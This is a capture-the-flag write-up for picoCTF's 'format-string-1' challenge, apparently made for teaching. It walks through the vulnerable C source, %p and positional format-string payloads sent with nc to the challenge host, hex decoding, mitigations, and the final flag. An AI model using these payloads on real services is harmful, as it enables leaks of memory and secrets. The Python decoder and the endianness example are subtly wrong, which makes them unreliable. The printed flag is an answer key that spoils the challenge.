# PicoCTF Format String 1 - Complete Writeup

## Challenge Overview

**Challenge Name:** format-string-1  
**Category:** Binary Exploitation  
**Description:** Patrick and SpongeBob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!  

This challenge presents a classic format string vulnerability that allows reading sensitive data directly from the program's stack memory.

## Initial Analysis

### Source Code Review

Let's examine the provided C source code to understand the program's functionality:

```c
#include <stdio.h>

int main() {
    char buf[1024];
    char secret1[64];
    char flag[64];
    char secret2[64];

    // Read in first secret menu item
    FILE *fd = fopen("secret-menu-item-1.txt", "r");
    if (fd == NULL){
        printf("'secret-menu-item-1.txt' file not found, aborting.\n");
        return 1;
    }
    fgets(secret1, 64, fd);
    
    // Read in the flag
    fd = fopen("flag.txt", "r");
    if (fd == NULL){
        printf("'flag.txt' file not found, aborting.\n");
        return 1;
    }
    fgets(flag, 64, fd);
    
    // Read in second secret menu item
    fd = fopen("secret-menu-item-2.txt", "r");
    if (fd == NULL){
        printf("'secret-menu-item-2.txt' file not found, aborting.\n");
        return 1;
    }
    fgets(secret2, 64, fd);

    printf("Give me your order and I'll read it back to you:\n");
    fflush(stdout);
    scanf("%1024s", buf);
    printf("Here's your order: ");
    printf(buf);  // VULNERABILITY!
    printf("\n");
    fflush(stdout);

    printf("Bye!\n");
    fflush(stdout);

    return 0;
}
```

## Vulnerability Analysis

### The Critical Vulnerability: Format String Bug

The primary vulnerability lies in this line within the main function:

```c
printf(buf);  // DANGEROUS!
```

**Why this is vulnerable:**
- User input (`buf`) is passed directly as the format string to `printf()`
- `printf()` interprets format specifiers (like `%p`, `%x`, `%s`) in the input
- If format specifiers are present, `printf()` reads additional arguments from the stack
- Since no arguments are provided, it reads arbitrary stack data

### Stack Layout Understanding

When `main()` executes, four local variables are allocated on the stack:
1. `char buf[1024]` - User input buffer
2. `char secret1[64]` - First secret menu item
3. `char flag[64]` - **The flag we want to extract**
4. `char secret2[64]` - Second secret menu item

The program loads the flag content from `flag.txt` into the `flag` array, placing it directly on the stack where it can be accessed through format string exploitation.

### Input Validation

The program uses `scanf("%1024s", buf)` which:
- Limits input to 1023 characters plus null terminator
- Prevents buffer overflow in the `buf` array
- **Does NOT prevent format string attacks**

### The Attack Vector

The vulnerability allows us to:
1. **Read stack memory**: Using `%p` to dump pointer values
2. **Access arbitrary stack offsets**: Using positional parameters like `%10$p`
3. **Read strings**: Using `%s` to dereference pointers to strings
4. **Extract the flag**: Since it's stored as a string on the stack

## Exploitation Strategy

### Step 1: Stack Reconnaissance

We need to probe the stack to locate where the flag data is stored. Using multiple pointer format specifiers helps us dump stack contents systematically.

**Reconnaissance payload:**
```
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
```

This payload uses 24 `%p` specifiers separated by commas for readability. Each `%p` reads 8 bytes from the stack (on 64-bit systems) and displays them as hexadecimal pointers.

### Step 2: Analyzing Stack Dump

When we execute our reconnaissance payload, we get a stack dump showing hexadecimal values:

![Stack dump output showing hexadecimal values](https://github.com/user-attachments/assets/4528965d-629e-4729-8ebd-95a160b11fdc)

The output contains various stack values, including:
- Return addresses
- Stack frame pointers
- **Our target: The flag data encoded as hex values**

### Step 3: Identifying Flag Data

Looking at the hex dump, we need to identify which values represent ASCII characters that could be part of our flag. Flag formats typically start with `picoCTF{` and end with `}`.

**Key indicators:**
- Hex values that convert to printable ASCII characters
- Patterns that suggest the flag format
- Values that appear to be string data rather than addresses

## Exploitation Methods

### Method 1: Manual Stack Dump and Hex Conversion

**Step 1: Execute the reconnaissance payload**
```bash
echo "%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p" | nc mimas.picoctf.net 62178
```

**Step 2: Extract relevant hex values from the output**

From the stack dump, we identify hex values that look like they could contain ASCII data.

**Step 3: Convert hex to ASCII using CyberChef**

![CyberChef hex to ASCII conversion](https://github.com/user-attachments/assets/b9b40b5d-5e45-4017-9ffd-d8f1ece6fa65)

Using CyberChef's "From Hex" operation on the extracted values gives us:
```
{FTCocip5_14m1n44x4_31y746_g41f_}611772wu.Ñc..0...r.æ.7C.%
3lytS	
```

**Step 4: Handle endianness**

The garbled output occurs because x86-64 uses little-endian byte ordering. We need to reverse each 4-byte or 8-byte chunk to get the correct character order.

### Method 2: Command Line Hex Processing

![Alternative approach using command line tools](https://github.com/user-attachments/assets/9c8c11e7-d0dc-4a35-9696-48369fddaef8)

For each hex value identified as containing flag data:

```bash
echo 'hex_value' | xxd -r -p | rev
```

**Command breakdown:**
- `xxd -r -p`: Converts hex back to binary
  - `xxd` is a hex dump utility
  - `-r` reverses a hex dump back to binary
  - `-p` processes plain hex input without addresses
- `rev`: Reverses the string to handle little-endian byte order

### Method 3: Python Script for Automation

```python
import struct

# Hex values extracted from stack dump (example)
hex_values = [
    "0x7b465443",  # Part of flag
    "0x346e316d",  # Part of flag
    "0x5f313734",  # Part of flag
    # ... more values
]

flag_parts = []
for hex_val in hex_values:
    # Convert hex string to integer
    val = int(hex_val, 16)
    # Pack as little-endian 4-byte integer, then decode
    try:
        chars = struct.pack('<I', val).decode('ascii')
        # Reverse to handle endianness
        flag_parts.append(chars[::-1])
    except:
        continue

print(''.join(flag_parts))
```

## Technical Deep Dive

### Memory Layout Visualization

**Stack layout during execution:**
```
Higher addresses
+-------------------+
|   Return address  |
+-------------------+
|   buf[1024]       |  <- User input buffer
+-------------------+
|   secret1[64]     |  <- "secret-menu-item-1.txt" content
+-------------------+
|   flag[64]        |  <- FLAG DATA (our target)
+-------------------+
|   secret2[64]     |  <- "secret-menu-item-2.txt" content
+-------------------+
Lower addresses
```

### Format String Attack Mechanics

When `printf(buf)` executes with our payload:

1. **Format specifier parsing**: `printf()` scans the format string for `%` characters
2. **Argument retrieval**: For each specifier, it expects an argument from the stack
3. **Stack walking**: Since no arguments were provided, it reads from the stack frame
4. **Data extraction**: Each `%p` reads 8 bytes and displays them as hex

### Endianness Impact

**Little-endian storage example:**
- String: "pico"
- ASCII: 70 69 63 6F (hex)
- Little-endian storage: 6F 63 69 70
- Stack read: 0x6f636970
- Reversed: "ocip" → "pico"

This is why we need to reverse the hex-decoded chunks to reconstruct the original string.

## Advanced Techniques

### Positional Parameters

Instead of using many `%p` specifiers, we can use positional parameters:

```c
printf("%10$p");  // Read the 10th argument from the stack
```

This allows targeted access to specific stack positions once we know the flag's location.

### String Extraction

If we find that a stack position contains a pointer to our flag string:

```c
printf("%10$s");  // Print the string pointed to by the 10th stack argument
```

This can directly extract string data without manual hex conversion.

## Key Learning Points

### Vulnerability Classes Demonstrated

1. **Format String Vulnerability**: Improper use of format functions with user input
2. **Information Disclosure**: Unintended exposure of stack memory contents
3. **Stack Memory Layout Exploitation**: Understanding how local variables are arranged

### Security Implications

This vulnerability demonstrates how format string bugs can lead to:
- **Memory disclosure**: Reading sensitive data from stack/heap
- **Information leakage**: Exposing internal program state
- **Potential code execution**: Advanced format string attacks can achieve arbitrary write

### Real-World Impact

Format string vulnerabilities have been found in:
- **System utilities**: Programs like `syslog()` that process user format strings
- **Network services**: Applications that log user input without sanitization
- **Embedded systems**: Firmware with debug printf statements

## Mitigation Strategies

### Secure Coding Practices

**Never use user input as format strings:**
```c
// Vulnerable
printf(user_input);

// Secure
printf("%s", user_input);
```

**Use compiler warnings:**
```bash
gcc -Wformat-security -Werror=format-security source.c
```

**Input validation:**
```c
// Sanitize input to remove format specifiers
char* sanitize_input(char* input) {
    char* sanitized = malloc(strlen(input) + 1);
    int j = 0;
    for (int i = 0; input[i]; i++) {
        if (input[i] != '%') {
            sanitized[j++] = input[i];
        }
    }
    sanitized[j] = '\0';
    return sanitized;
}
```

## Conclusion

The format-string-1 challenge excellently demonstrates fundamental concepts in binary exploitation:
- Format string vulnerability mechanics
- Stack memory layout and access
- Little-endian byte ordering
- Data extraction and reconstruction techniques

Understanding these concepts is crucial for both security research and secure software development.

**Final Flag:** `picoCTF{4n1m41_57y13_4x4_f14g_64277116}`

The flag reveals itself through careful stack memory analysis and proper handling of little-endian byte ordering, showcasing the power and danger of format string vulnerabilities in real-world applications.
